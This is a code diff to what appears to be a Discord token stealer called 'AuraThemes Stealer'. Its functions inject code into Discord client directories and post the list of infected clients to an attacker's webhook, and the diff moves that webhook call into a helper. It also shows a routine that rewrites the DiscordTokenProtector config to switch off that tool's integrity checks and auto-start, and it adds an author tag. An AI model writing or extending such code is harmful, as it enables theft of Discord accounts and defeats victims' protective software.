@@ -1,9 +1,14 @@
-const { getUsers }  = require('../../../utils/harware.js');
+const {
+    sendWebhook 
+} = require('../../../utils/request/sendWebhook.js');
+
+const {
+    getUsers 
+} = require('../../../utils/harware.js');
 
 const child_process = require('child_process');
 const fsPromises    = require('fs/promises');
 const jsConfuser    = require('js-confuser');
-const FormData      = require('form-data');
 const axios         = require('axios');
 const path          = require('path');
 const fs            = require('fs');
@@ -74,31 +79,19 @@ async function injectDiscord(dir, injectionUrl, webhook) {
                 console.error(`Failed to process ${coreDir}:`, error);
             }
         }
+
         const description = infectedDiscord.size > 0 ? Array.from(infectedDiscord).map(name => `\`${name}\``).join(", ") : `\`Not found\``;
-        const payload = {
-            avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-            username: 'AuraThemes Stealer - Injection',
+        const data = {
             embeds: [
                 {
                     title: 'Discord(s) injected(s)',
-                    color: "12740607",
-                    description: description,
-                    timestamp: new Date(),
-                    footer: {
-                        text: 'AuraThemes Stealer | Injection',
-                        icon_url: 'https://i.imgur.com/yVnOSeS.gif'
-                    }
+                    description,
                 }
             ]
         };
+
         try {
-            const form = new FormData();
-            form.append('payload_json', JSON.stringify(payload));
-            await axios.post(webhook, form, {
-                headers: {
-                    ...form.getHeaders()
-                }
-            });
+            await sendWebhook(webhook, data);
         } catch (err) {
             console.error("Failed to send webhook:", err);
         }
@@ -143,6 +136,7 @@ function bypassTokenProtector(user) {
         if (fs.existsSync(configPath)) {
             const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
             Object.assign(config, {
+                k4itrun_is_here: "https://discord.gg/6TGcqtbbHp",
                 auto_start: false,
                 auto_start_discord: false,
                 integrity: false,
@@ -158,6 +152,7 @@ function bypassTokenProtector(user) {
                 version: 69420
             });
             fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
+            fs.appendFileSync(config, `\n\n//k4itrun_is_here | https://discord.gg/6TGcqtbbHp`, 'utf8');
         }
     } catch (error) {
         console.error('Failed to bypass TokenProtector:', error);
